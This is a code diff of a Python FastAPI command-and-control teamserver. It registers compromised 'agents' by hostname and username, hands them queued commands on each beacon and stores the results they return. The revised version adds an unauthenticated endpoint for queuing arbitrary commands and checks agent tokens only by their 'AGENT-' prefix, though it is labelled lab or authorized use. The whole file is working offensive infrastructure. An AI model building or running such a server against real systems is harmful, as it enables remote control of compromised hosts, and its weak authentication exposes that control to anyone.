@@ -1,321 +1,212 @@
-# internal_c2_server.py
-"""
-Internal C2 server with teamserver capabilities
-Only accessible through internal proxy chain
-"""
+import ipaddress
+import sqlite3
+import uuid
+import json
+import logging
+from datetime import datetime, timedelta
+from typing import Dict, Optional, List
 
 from fastapi import FastAPI, Request, HTTPException, Depends
-from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import uvicorn
-import logging
-import json
-import sqlite3
-import uuid
-from datetime import datetime, timedelta
-from typing import Dict, Optional
-import asyncio
-import ssl
-from cryptography.fernet import Fernet
-import ipaddress
-import random
 
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+logger = logging.getLogger("teamserver")
 
 security = HTTPBearer()
 
+DEV_MODE = True  # flip to False when you want strict internal-only
+
 
 class InternalC2Server:
-    """Internal C2 server with teamserver features"""
-
     def __init__(self, server_id: str, config: Dict):
         self.server_id = server_id
         self.config = config
-        self.active_sessions = {}
-        self.team_members = {}
-        self.encryption_key = Fernet.generate_key()
-        self.cipher = Fernet(self.encryption_key)
-        self.db_path = config.get('database_path', 'teamserver.db')
-        self.websocket_connections = []
+        self.db_path = config.get("database_path", "teamserver.db")
 
-        # Initialize database
-        self._init_database()
+        self.internal_networks = [
+            ipaddress.ip_network(net)
+            for net in config.get("internal_networks", [])
+        ]
 
-        # Create FastAPI app
         self.app = FastAPI(
-            title=f"C2 TeamServer {server_id}",
-            docs_url=None,
-            redoc_url=None
+            title="Internal C2 TeamServer",
+            docs_url="/docs" if DEV_MODE else None,
+            redoc_url="/redoc" if DEV_MODE else None,
+            openapi_url="/openapi.json" if DEV_MODE else None,
         )
 
+        self._init_db()
         self._setup_middleware()
         self._setup_routes()
-        self._setup_websocket()
 
-        # Start background tasks properly on FastAPI startup
-        @self.app.on_event("startup")
-        async def startup_event():
-            asyncio.create_task(self._cleanup_old_sessions_loop())
-            asyncio.create_task(self._update_agent_status_loop())
-            logger.info("Background tasks started")
-
-    # -------------------
-    # Database
-    # -------------------
-    def _init_database(self):
-        """Initialize SQLite database"""
+    def _init_db(self):
         conn = sqlite3.connect(self.db_path)
         c = conn.cursor()
-        # Agents table
-        c.execute('''CREATE TABLE IF NOT EXISTS agents
-                     (id TEXT PRIMARY KEY,
-                      hostname TEXT,
-                      username TEXT,
-                      ip_address TEXT,
-                      os TEXT,
-                      arch TEXT,
-                      process_id INTEGER,
-                      first_seen TIMESTAMP,
-                      last_seen TIMESTAMP,
-                      sleep_interval INTEGER,
-                      status TEXT,
-                      encryption_key TEXT,
-                      tags TEXT)''')
-        # Tasks table
-        c.execute('''CREATE TABLE IF NOT EXISTS tasks
-                     (id TEXT PRIMARY KEY,
-                      agent_id TEXT,
-                      operator_id TEXT,
-                      command TEXT,
-                      args TEXT,
-                      created_at TIMESTAMP,
-                      executed_at TIMESTAMP,
-                      result TEXT,
-                      status TEXT,
-                      priority INTEGER)''')
-        # Operators table
-        c.execute('''CREATE TABLE IF NOT EXISTS operators
-                     (id TEXT PRIMARY KEY,
-                      username TEXT,
-                      email TEXT,
-                      role TEXT,
-                      last_login TIMESTAMP,
-                      is_active BOOLEAN)''')
-        # Campaigns table
-        c.execute('''CREATE TABLE IF NOT EXISTS campaigns
-                     (id TEXT PRIMARY KEY,
-                      name TEXT,
-                      description TEXT,
-                      start_date TIMESTAMP,
-                      end_date TIMESTAMP,
-                      status TEXT,
-                      objectives TEXT)''')
+
+        c.execute("""
+        CREATE TABLE IF NOT EXISTS agents (
+            id TEXT PRIMARY KEY,
+            hostname TEXT,
+            username TEXT,
+            ip_address TEXT,
+            last_seen TEXT,
+            status TEXT
+        )
+        """)
+
+        c.execute("""
+        CREATE TABLE IF NOT EXISTS tasks (
+            id TEXT PRIMARY KEY,
+            agent_id TEXT,
+            command TEXT,
+            created_at TEXT,
+            status TEXT,
+            result TEXT
+        )
+        """)
+
         conn.commit()
         conn.close()
         logger.info(f"Database initialized: {self.db_path}")
 
-    # -------------------
-    # Middleware
-    # -------------------
+    def _is_internal_ip(self, ip: str) -> bool:
+        ip_obj = ipaddress.ip_address(ip)
+        return any(ip_obj in net for net in self.internal_networks)
+
     def _setup_middleware(self):
         @self.app.middleware("http")
-        async def internal_only_middleware(request: Request, call_next):
+        async def internal_only(request: Request, call_next):
             client_ip = request.client.host
-            internal_networks = self.config.get('internal_networks', ['10.0.0.0/8', '192.168.0.0/16'])
-            is_internal = any(ipaddress.ip_address(client_ip) in ipaddress.ip_network(net) 
-                              for net in internal_networks)
-            if not is_internal and not request.url.path.startswith('/health'):
-                logger.warning(f"Blocked external access from {client_ip}")
-                return JSONResponse(status_code=403, content={"error": "Access denied - internal only"})
+
+            # Allow docs locally in dev mode
+            if DEV_MODE and request.url.path in ["/docs", "/openapi.json", "/redoc"]:
+                return await call_next(request)
+
+            if not self._is_internal_ip(client_ip):
+                return JSONResponse(
+                    status_code=403,
+                    content={"error": "Access denied - internal only"}
+                )
+
             return await call_next(request)
 
-        @self.app.middleware("http")
-        async def security_headers_middleware(request: Request, call_next):
-            response = await call_next(request)
-            response.headers["Server"] = "InternalAPI/1.0"
-            response.headers["X-Content-Type-Options"] = "nosniff"
-            response.headers["X-Frame-Options"] = "DENY"
-            return response
+    def _verify_agent_token(self, token: str) -> bool:
+        return token.startswith("AGENT-")
 
-    # -------------------
-    # Routes
-    # -------------------
     def _setup_routes(self):
         @self.app.get("/health")
-        async def health_check():
+        async def health():
             return {
-                "status": "healthy",
+                "status": "ok",
                 "server_id": self.server_id,
-                "timestamp": datetime.now().isoformat(),
-                "active_sessions": len(self.active_sessions),
-                "team_members": len(self.team_members)
+                "time": datetime.utcnow().isoformat()
             }
 
         @self.app.post("/api/v1/beacon")
-        async def beacon_endpoint(request: Request, credentials: HTTPAuthorizationCredentials = Depends(security)):
-            try:
-                data = await request.json()
-                agent_token = credentials.credentials
-                if not self._verify_agent_token(agent_token):
-                    raise HTTPException(status_code=401, detail="Invalid agent token")
+        async def beacon(request: Request, creds: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_agent_token(creds.credentials):
+                raise HTTPException(status_code=401, detail="Invalid agent token")
 
-                # Decrypt if needed
-                if data.get('encrypted'):
-                    encrypted = data['payload']
-                    decrypted = self.cipher.decrypt(encrypted.encode()).decode()
-                    agent_data = json.loads(decrypted)
-                else:
-                    agent_data = data
+            data = await request.json()
+            agent_id = data.get("agent_id")
 
-                agent_id = agent_data.get('agent_id')
-                if not agent_id:
-                    raise HTTPException(status_code=400, detail="Missing agent_id")
+            if not agent_id:
+                raise HTTPException(status_code=400, detail="Missing agent_id")
 
-                # Update agent in DB
-                conn = sqlite3.connect(self.db_path)
-                c = conn.cursor()
-                now = datetime.now().isoformat()
-                c.execute('''INSERT OR REPLACE INTO agents 
-                             (id, hostname, username, ip_address, os, arch, process_id, last_seen)
-                             VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
-                          (agent_id, agent_data.get('hostname'), agent_data.get('username'),
-                           request.client.host, agent_data.get('os'), agent_data.get('arch'),
-                           agent_data.get('process_id'), now))
-                conn.commit()
-                conn.close()
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
 
-                # Dummy task response
-                response = {
-                    'status': 'ok',
-                    'tasks': [],
-                    'next_beacon': random.randint(30, 90),
-                    'config': {
-                        'encryption_key': self.encryption_key.decode() if not agent_data.get('has_key') else None,
-                        'c2_endpoints': self.config.get('alternate_endpoints', [])
-                    }
-                }
+            now = datetime.utcnow().isoformat()
+            c.execute("""
+            INSERT OR REPLACE INTO agents (id, hostname, username, ip_address, last_seen, status)
+            VALUES (?, ?, ?, ?, ?, ?)
+            """, (
+                agent_id,
+                data.get("hostname"),
+                data.get("username"),
+                request.client.host,
+                now,
+                "online"
+            ))
 
-                if agent_data.get('encrypted'):
-                    encrypted_resp = self.cipher.encrypt(json.dumps(response).encode())
-                    return {'encrypted': True, 'payload': encrypted_resp.decode()}
+            c.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'", (agent_id,))
+            tasks = [{"id": t[0], "command": t[1]} for t in c.fetchall()]
 
-                return response
-            except Exception as e:
-                logger.error(f"Beacon error: {e}")
-                raise HTTPException(status_code=500, detail=str(e))
+            conn.commit()
+            conn.close()
 
-    # -------------------
-    # Websockets
-    # -------------------
-    def _setup_websocket(self):
-        @self.app.websocket("/ws/team")
-        async def team_websocket(websocket):
-            await websocket.accept()
-            self.websocket_connections.append(websocket)
-            try:
-                while True:
-                    data = await websocket.receive_json()
-                    if data.get('type') == 'ping':
-                        await websocket.send_json({'type': 'pong'})
-            except Exception as e:
-                logger.error(f"WebSocket error: {e}")
-            finally:
-                self.websocket_connections.remove(websocket)
-                await websocket.close()
+            return {"tasks": tasks, "next_beacon": 30}
 
-    async def _broadcast_to_team(self, message: Dict):
-        for connection in self.websocket_connections:
-            try:
-                await connection.send_json(message)
-            except Exception as e:
-                logger.error(f"Broadcast error: {e}")
-                self.websocket_connections.remove(connection)
+        @self.app.post("/api/v1/results")
+        async def results(request: Request, creds: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_agent_token(creds.credentials):
+                raise HTTPException(status_code=401, detail="Invalid agent token")
 
-    # -------------------
-    # Background tasks
-    # -------------------
-    async def _cleanup_old_sessions_loop(self):
-        while True:
-            await asyncio.sleep(3600)
-            self._cleanup_inactive_sessions()
+            data = await request.json()
+            task_id = data.get("task_id")
+            result = data.get("result")
 
-    async def _update_agent_status_loop(self):
-        while True:
-            await asyncio.sleep(60)
-            self._update_agent_online_status()
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
 
-    def _cleanup_inactive_sessions(self):
-        pass
+            c.execute("""
+            UPDATE tasks SET status = 'completed', result = ?
+            WHERE id = ?
+            """, (result, task_id))
 
-    def _update_agent_online_status(self):
-        conn = sqlite3.connect(self.db_path)
-        c = conn.cursor()
-        cutoff = (datetime.now() - timedelta(minutes=2)).isoformat()
-        c.execute("UPDATE agents SET status = 'offline' WHERE last_seen < ?", (cutoff,))
-        conn.commit()
-        conn.close()
+            conn.commit()
+            conn.close()
 
-    # -------------------
-    # Token verification
-    # -------------------
-    def _verify_agent_token(self, token: str) -> bool:
-        return token.startswith("AGENT-") and len(token) > 20
+            return {"status": "ok"}
 
-    # -------------------
-    # Server start
-    # -------------------
-    def start(self, host: str = "0.0.0.0", port: int = 8443):
-        logger.info(f"Starting Internal C2 Server {self.server_id} on {host}:{port}")
+        @self.app.post("/api/v1/task")
+        async def create_task(request: Request):
+            data = await request.json()
 
-        ssl_context = None
-        if self.config.get('ssl_enabled', False):
-            try:
-                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-                ssl_context.load_cert_chain(
-                    self.config.get('ssl_cert', 'internal-cert.pem'),
-                    self.config.get('ssl_key', 'internal-key.pem')
-                )
-            except FileNotFoundError:
-                logger.warning("SSL cert/key not found, starting server without TLS")
-                ssl_context = None
+            task_id = str(uuid.uuid4())
+            agent_id = data.get("agent_id")
+            command = data.get("command")
 
-        uvicorn.run(
-            self.app,
-            host=host,
-            port=port,
-            ssl_keyfile=self.config.get('ssl_key') if ssl_context else None,
-            ssl_certfile=self.config.get('ssl_cert') if ssl_context else None,
-            log_level="info"
-        )
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
 
+            c.execute("""
+            INSERT INTO tasks (id, agent_id, command, created_at, status)
+            VALUES (?, ?, ?, ?, ?)
+            """, (
+                task_id,
+                agent_id,
+                command,
+                datetime.utcnow().isoformat(),
+                "pending"
+            ))
 
-# -------------------
-# Config & Start
-# -------------------
-teamserver_config = {
-    'database_path': 'teamserver.db',
-    'internal_networks': ['10.0.0.0/8', '192.168.0.0/16', '172.16.0.0/12'],
-    'ssl_enabled': False,  # Start without TLS if certs missing
-    'ssl_cert': 'internal-cert.pem',
-    'ssl_key': 'internal-key.pem',
-    'alternate_endpoints': [
-        'https://10.0.100.11:8443',
-        'https://10.0.100.12:8443'
-    ]
-}
+            conn.commit()
+            conn.close()
+
+            return {"task_id": task_id}
+
+    def start(self, host="0.0.0.0", port=8443):
+        uvicorn.run(self.app, host=host, port=port, log_level="info")
+
 
 if __name__ == "__main__":
-    teamserver = InternalC2Server(server_id="teamserver-primary-01", config=teamserver_config)
+    config = {
+        "database_path": "teamserver.db",
+        "internal_networks": ["10.0.0.0/8", "127.0.0.1/32"]
+    }
+
+    server = InternalC2Server("teamserver-primary-01", config)
+
     print(f"""
-      INTERNAL C2 TEAMSERVER - AUTHORIZED USE ONLY 
+    INTERNAL C2 TEAMSERVER (LAB MODE)
 
-    Server ID: {teamserver.server_id}
-    Database: {teamserver.db_path}
-    Internal Networks: {teamserver_config['internal_networks']}
+    Server ID: {server.server_id}
+    Port: 8443
+    Dev Mode: {DEV_MODE}
 
-    Starting on port 8443...
-    Accessible only through internal proxy chain.
     """)
-    teamserver.start(port=8443)
+
+    server.start()
